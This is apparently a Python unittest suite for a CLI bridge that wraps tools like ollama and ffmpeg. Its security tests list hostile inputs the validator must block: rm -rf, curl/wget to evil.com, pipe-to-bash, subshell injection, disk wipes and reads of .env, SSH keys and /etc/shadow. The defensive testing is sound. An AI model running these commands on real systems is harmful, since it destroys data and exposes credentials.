"""
Tests for core/cli_bridge.py — DOF wrapper over CLI-Anything.

55 tests covering:
- CLIResult / CLIApp / BridgeHealth dataclasses
- Security validation (dangerous patterns, binary whitelist, shell injection)
- App discovery and health
- Command execution (mocked)
- Smart suggestions
- Logging
- CLI modes (health, list, caps)
"""

import json
import os
import sys
import time
import unittest
from pathlib import Path
from unittest.mock import patch, MagicMock, mock_open
import tempfile
import subprocess

# Ensure project root is in path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.cli_bridge import (
    CLIBridge, CLIResult, CLIApp, BridgeHealth,
    _DANGEROUS_PATTERNS, _ALLOWED_BINARIES, _SUGGESTIONS,
)


# ═══════════════════════════════════════════════════
# TEST HELPERS
# ═══════════════════════════════════════════════════

def make_bridge(tmp_dir: str) -> CLIBridge:
    """Create a CLIBridge that logs to a temp directory."""
    return CLIBridge(log_dir=tmp_dir, timeout=5)


# ═══════════════════════════════════════════════════
# DATACLASSES
# ═══════════════════════════════════════════════════

class TestCLIResult(unittest.TestCase):

    def test_basic_success_result(self):
        r = CLIResult(
            cli="ollama", command=["model", "list"],
            success=True, output="models...", error="",
            exit_code=0, elapsed_ms=120.0,
        )
        self.assertTrue(r.success)
        self.assertEqual(r.exit_code, 0)
        self.assertEqual(r.cli, "ollama")

    def test_default_blocked_false(self):
        r = CLIResult(
            cli="x", command=[], success=False,
            output="", error="err", exit_code=1, elapsed_ms=0,
        )
        self.assertFalse(r.blocked)
        self.assertEqual(r.block_reason, "")
        self.assertEqual(r.suggestion, "")

    def test_blocked_result(self):
        r = CLIResult(
            cli="x", command=[], success=False,
            output="", error="blocked", exit_code=-1, elapsed_ms=0,
            blocked=True, block_reason="dangerous pattern",
        )
        self.assertTrue(r.blocked)
        self.assertEqual(r.block_reason, "dangerous pattern")

    def test_timestamp_auto_set(self):
        before = time.time()
        r = CLIResult(
            cli="x", command=[], success=True,
            output="", error="", exit_code=0, elapsed_ms=0,
        )
        after = time.time()
        self.assertGreaterEqual(r.timestamp, before)
        self.assertLessEqual(r.timestamp, after)


class TestCLIApp(unittest.TestCase):

    def test_basic_app(self):
        app = CLIApp(
            name="ollama", binary="cli-anything-ollama",
            description="Local LLM", installed=True,
            backend="ollama", category="ai",
        )
        self.assertTrue(app.installed)
        self.assertEqual(app.category, "ai")
        self.assertEqual(app.capabilities, [])

    def test_app_with_capabilities(self):
        app = CLIApp(
            name="audacity", binary="cli-anything-audacity",
            description="Audio", installed=False,
            backend="sox", category="audio",
            capabilities=["record", "edit", "effects"],
        )
        self.assertIn("record", app.capabilities)
        self.assertFalse(app.installed)


class TestBridgeHealth(unittest.TestCase):

    def test_health_object(self):
        h = BridgeHealth(
            apps_registered=9,
            apps_installed=2,
            apps_available=["ollama", "audacity"],
            apps_missing=["gimp"],
            total_commands_executed=10,
            total_commands_blocked=1,
            uptime_seconds=300.0,
        )
        self.assertEqual(h.apps_registered, 9)
        self.assertEqual(len(h.apps_available), 2)


# ═══════════════════════════════════════════════════
# SECURITY PATTERNS
# ═══════════════════════════════════════════════════

class TestDangerousPatterns(unittest.TestCase):

    def _matches(self, text: str) -> bool:
        return any(p.search(text) for p in _DANGEROUS_PATTERNS)

    def test_rm_rf_root(self):
        self.assertTrue(self._matches("rm -rf /"))

    def test_rm_rf_home(self):
        self.assertTrue(self._matches("rm -rf ~"))

    def test_curl_injection(self):
        self.assertTrue(self._matches("cmd; curl http://evil.com"))

    def test_wget_injection(self):
        self.assertTrue(self._matches("cmd; wget http://evil.com"))

    def test_pipe_bash(self):
        self.assertTrue(self._matches("echo x | bash"))

    def test_pipe_sh(self):
        self.assertTrue(self._matches("echo x | sh"))

    def test_backtick(self):
        self.assertTrue(self._matches("`rm -rf /tmp`"))

    def test_subshell(self):
        self.assertTrue(self._matches("$(rm -rf /tmp)"))

    def test_disk_write(self):
        self.assertTrue(self._matches("dd if=file > /dev/sda"))

    def test_mkfs(self):
        self.assertTrue(self._matches("mkfs.ext4 /dev/sdb1"))

    def test_dd_disk(self):
        self.assertTrue(self._matches("dd if=/dev/zero"))

    def test_chmod_777(self):
        self.assertTrue(self._matches("chmod 777 /etc"))

    def test_env_file(self):
        self.assertTrue(self._matches("cat .env"))

    def test_private_key(self):
        self.assertTrue(self._matches("cat private.key"))

    def test_id_rsa(self):
        self.assertTrue(self._matches("cat ~/.ssh/id_rsa"))

    def test_etc_passwd(self):
        self.assertTrue(self._matches("cat /etc/passwd"))

    def test_etc_shadow(self):
        self.assertTrue(self._matches("cat /etc/shadow"))

    def test_safe_ollama_cmd(self):
        self.assertFalse(self._matches("cli-anything-ollama --json model list"))

    def test_safe_ffmpeg_cmd(self):
        self.assertFalse(self._matches("ffmpeg -i input.wav output.mp3"))

    def test_safe_help(self):
        self.assertFalse(self._matches("cli-anything-gimp --help"))


class TestAllowedBinaries(unittest.TestCase):

    def test_ollama_allowed(self):
        self.assertIn("cli-anything-ollama", _ALLOWED_BINARIES)
        self.assertIn("ollama", _ALLOWED_BINARIES)

    def test_audacity_allowed(self):
        self.assertIn("cli-anything-audacity", _ALLOWED_BINARIES)

    def test_ffmpeg_allowed(self):
        self.assertIn("ffmpeg", _ALLOWED_BINARIES)

    def test_bash_not_allowed(self):
        self.assertNotIn("bash", _ALLOWED_BINARIES)

    def test_curl_not_allowed(self):
        self.assertNotIn("curl", _ALLOWED_BINARIES)

    def test_rm_not_allowed(self):
        self.assertNotIn("rm", _ALLOWED_BINARIES)


# ═══════════════════════════════════════════════════
# CLI BRIDGE — VALIDATION
# ═══════════════════════════════════════════════════

class TestValidation(unittest.TestCase):

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.bridge = make_bridge(self.tmp)

    def test_allowed_binary_passes(self):
        safe, reason = self.bridge.validate_command("ollama", ["model", "list"])
        self.assertTrue(safe)
        self.assertEqual(reason, "OK")

    def test_disallowed_binary_blocked(self):
        safe, reason = self.bridge.validate_command("bash", ["-c", "echo x"])
        self.assertFalse(safe)
        self.assertIn("allowed list", reason)

    def test_dangerous_pattern_blocked(self):
        safe, reason = self.bridge.validate_command("ollama", ["rm", "-rf", "/"])
        self.assertFalse(safe)
        self.assertIn("Dangerous pattern", reason)

    def test_shell_injection_in_arg(self):
        safe, reason = self.bridge.validate_command(
            "cli-anything-ollama", ["--name", "x; curl evil.com"]
        )
        self.assertFalse(safe)
        # Either blocked by dangerous pattern or metacharacter check
        self.assertTrue("metacharacter" in reason or "Dangerous pattern" in reason)

    def test_ampersand_injection(self):
        safe, reason = self.bridge.validate_command(
            "ollama", ["&&", "curl", "evil.com"]
        )
        self.assertFalse(safe)

    def test_pipe_injection_in_arg(self):
        safe, reason = self.bridge.validate_command(
            "ollama", ["model | bash"]
        )
        self.assertFalse(safe)

    def test_backtick_in_arg(self):
        safe, reason = self.bridge.validate_command(
            "ollama", ["`rm -rf /`"]
        )
        self.assertFalse(safe)

    def test_clean_args_pass(self):
        safe, _ = self.bridge.validate_command(
            "cli-anything-audacity",
            ["--json", "record", "--duration", "30", "--output", "audio.wav"]
        )
        self.assertTrue(safe)


# ═══════════════════════════════════════════════════
# CLI BRIDGE — EXECUTION (MOCKED)
# ═══════════════════════════════════════════════════

class TestExecution(unittest.TestCase):

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.bridge = make_bridge(self.tmp)

    def test_blocked_command_not_executed(self):
        """Dangerous commands are blocked before subprocess runs."""
        with patch("subprocess.run") as mock_run:
            result = self.bridge.execute("bash", ["-c", "echo x"])
            mock_run.assert_not_called()
        self.assertFalse(result.success)
        self.assertTrue(result.blocked)

    def test_missing_binary_suggestion(self):
        """Missing binary returns suggestion without executing."""
        with patch("shutil.which", return_value=None):
            bridge = make_bridge(self.tmp)
        # gimp is not installed in test env (likely)
        result = bridge.execute("gimp", ["--help"])
        # Either not installed or blocked — either way, no crash
        self.assertIsInstance(result, CLIResult)

    @patch("subprocess.run")
    def test_successful_execution(self, mock_run):
        """Successful subprocess run produces CLIResult with success=True."""
        mock_proc = MagicMock()
        mock_proc.stdout = '{"models": [{"name": "qwen3:8b"}]}'
        mock_proc.stderr = ""
        mock_proc.returncode = 0
        mock_run.return_value = mock_proc

        # Patch app as installed
        bridge = make_bridge(self.tmp)
        bridge._apps["ollama"].installed = True

        result = bridge.execute("ollama", ["model", "list"])
        self.assertTrue(result.success)
        self.assertEqual(result.exit_code, 0)
        self.assertGreater(result.elapsed_ms, 0)

    @patch("subprocess.run")
    def test_failed_execution(self, mock_run):
        """Non-zero exit code produces success=False."""
        mock_proc = MagicMock()
        mock_proc.stdout = ""
        mock_proc.stderr = "error: server not running"
        mock_proc.returncode = 1
        mock_run.return_value = mock_proc

        bridge = make_bridge(self.tmp)
        bridge._apps["ollama"].installed = True

        result = bridge.execute("ollama", ["model", "list"])
        self.assertFalse(result.success)
        self.assertEqual(result.exit_code, 1)

    @patch("subprocess.run")
    def test_timeout_handling(self, mock_run):
        """TimeoutExpired exception is caught and returns exit_code=-3."""
        mock_run.side_effect = subprocess.TimeoutExpired(cmd=["ollama"], timeout=5)

        bridge = make_bridge(self.tmp)
        bridge._apps["ollama"].installed = True

        result = bridge.execute("ollama", ["model", "list"], timeout=5)
        self.assertFalse(result.success)
        self.assertEqual(result.exit_code, -3)
        self.assertIn("TIMEOUT", result.error)
        self.assertIn("suggestion", result.__dataclass_fields__)

    @patch("subprocess.run")
    def test_file_not_found(self, mock_run):
        """FileNotFoundError returns exit_code=-4."""
        mock_run.side_effect = FileNotFoundError("No such file")

        bridge = make_bridge(self.tmp)
        bridge._apps["ollama"].installed = True

        result = bridge.execute("ollama", ["model", "list"])
        self.assertFalse(result.success)
        self.assertEqual(result.exit_code, -4)

    def test_commands_executed_counter(self):
        """Counter increments on each successful execution."""
        with patch("subprocess.run") as mock_run:
            mock_proc = MagicMock()
            mock_proc.stdout = ""
            mock_proc.stderr = ""
            mock_proc.returncode = 0
            mock_run.return_value = mock_proc

            bridge = make_bridge(self.tmp)
            bridge._apps["ollama"].installed = True
            self.assertEqual(bridge._commands_executed, 0)
            bridge.execute("ollama", ["--version"])
            self.assertEqual(bridge._commands_executed, 1)

    def test_blocked_counter(self):
        """Blocked commands increment the blocked counter."""
        bridge = make_bridge(self.tmp)
        initial = bridge._commands_blocked
        bridge.execute("bash", ["-c", "echo x"])
        self.assertEqual(bridge._commands_blocked, initial + 1)


# ═══════════════════════════════════════════════════
# SUGGESTIONS
# ═══════════════════════════════════════════════════

class TestSuggestions(unittest.TestCase):

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.bridge = make_bridge(self.tmp)

    def test_ollama_empty_models_suggestion(self):
        output = '{"models": []}'
        suggestion = self.bridge._get_suggestion("ollama", output, "")
        self.assertIn("ollama pull", suggestion)

    def test_ollama_server_down_suggestion(self):
        error = "connection refused: could not connect"
        suggestion = self.bridge._get_suggestion("ollama", "", error)
        self.assertIn("ollama serve", suggestion)

    def test_no_suggestion_for_normal_output(self):
        output = '{"models": [{"name": "qwen3:8b"}]}'
        suggestion = self.bridge._get_suggestion("ollama", output, "")
        self.assertEqual(suggestion, "")

    def test_suggestion_dict_has_gimp(self):
        self.assertIn(("gimp", "gimp", "missing"), _SUGGESTIONS)


# ═══════════════════════════════════════════════════
# LOGGING
# ═══════════════════════════════════════════════════

class TestLogging(unittest.TestCase):

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.bridge = make_bridge(self.tmp)

    def test_log_creates_jsonl(self):
        result = CLIResult(
            cli="ollama", command=["model", "list"],
            success=True, output="test", error="",
            exit_code=0, elapsed_ms=50.0,
        )
        self.bridge._log(result)
        log_file = Path(self.tmp) / "cli_commands.jsonl"
        self.assertTrue(log_file.exists())

    def test_log_content_valid_json(self):
        result = CLIResult(
            cli="ollama", command=["model", "list"],
            success=True, output="test", error="",
            exit_code=0, elapsed_ms=50.0,
        )
        self.bridge._log(result)
        log_file = Path(self.tmp) / "cli_commands.jsonl"
        with open(log_file) as f:
            line = f.readline()
        data = json.loads(line)
        self.assertEqual(data["cli"], "ollama")
        self.assertTrue(data["success"])
        self.assertIn("timestamp", data)

    def test_log_blocked_command(self):
        result = CLIResult(
            cli="bash", command=["-c", "echo x"],
            success=False, output="", error="blocked",
            exit_code=-1, elapsed_ms=0,
            blocked=True, block_reason="dangerous",
        )
        self.bridge._log(result)
        log_file = Path(self.tmp) / "cli_commands.jsonl"
        with open(log_file) as f:
            data = json.loads(f.readline())
        self.assertTrue(data["blocked"])
        self.assertEqual(data["block_reason"], "dangerous")


# ═══════════════════════════════════════════════════
# HEALTH AND APPS
# ═══════════════════════════════════════════════════

class TestHealthAndApps(unittest.TestCase):

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.bridge = make_bridge(self.tmp)

    def test_health_returns_bridge_health(self):
        h = self.bridge.health()
        self.assertIsInstance(h, BridgeHealth)
        self.assertGreaterEqual(h.apps_registered, 0)
        self.assertGreaterEqual(h.apps_installed, 0)
        self.assertIsInstance(h.apps_available, list)
        self.assertIsInstance(h.apps_missing, list)

    def test_list_apps_returns_list(self):
        apps = self.bridge.list_apps()
        self.assertIsInstance(apps, list)
        for app in apps:
            self.assertIn("name", app)
            self.assertIn("installed", app)
            self.assertIn("category", app)

    def test_get_app_returns_cli_app(self):
        app = self.bridge.get_app("ollama")
        self.assertIsNotNone(app)
        self.assertIsInstance(app, CLIApp)
        self.assertEqual(app.name, "ollama")

    def test_get_nonexistent_app_returns_none(self):
        app = self.bridge.get_app("nonexistent_app_xyz")
        self.assertIsNone(app)

    def test_scan_capabilities_returns_dict(self):
        caps = self.bridge.scan_capabilities()
        self.assertIsInstance(caps, dict)
        # Each value should be a list of app names
        for cap, apps in caps.items():
            self.assertIsInstance(apps, list)

    def test_uptime_positive(self):
        h = self.bridge.health()
        self.assertGreaterEqual(h.uptime_seconds, 0)

    def test_registered_apps_count(self):
        # Registry has at least 9 apps
        h = self.bridge.health()
        self.assertGreaterEqual(h.apps_registered, 9)


class TestJSONLLogging(unittest.TestCase):
    """Every CLI call must be persisted to cli_commands.jsonl (TODO item #3)."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.bridge = CLIBridge(log_dir=self.tmpdir)

    def _read_log(self):
        log_file = os.path.join(self.tmpdir, "cli_commands.jsonl")
        if not os.path.exists(log_file):
            return []
        with open(log_file) as f:
            return [json.loads(l) for l in f if l.strip()]

    def test_blocked_call_is_logged(self):
        self.bridge.execute(None, ["--help"])
        self.assertGreater(len(self._read_log()), 0)

    def test_log_entry_has_required_keys(self):
        self.bridge.execute(None, [])
        entry = self._read_log()[0]
        for key in ("timestamp", "cli", "command", "success", "blocked", "exit_code"):
            self.assertIn(key, entry)

    def test_blocked_entry_records_blocked_true(self):
        self.bridge.execute(None, [])
        self.assertTrue(self._read_log()[0]["blocked"])

    def test_multiple_calls_append_to_log(self):
        self.bridge.execute(None, [])
        self.bridge.execute(None, [])
        self.assertEqual(len(self._read_log()), 2)


if __name__ == "__main__":
    unittest.main(verbosity=2)
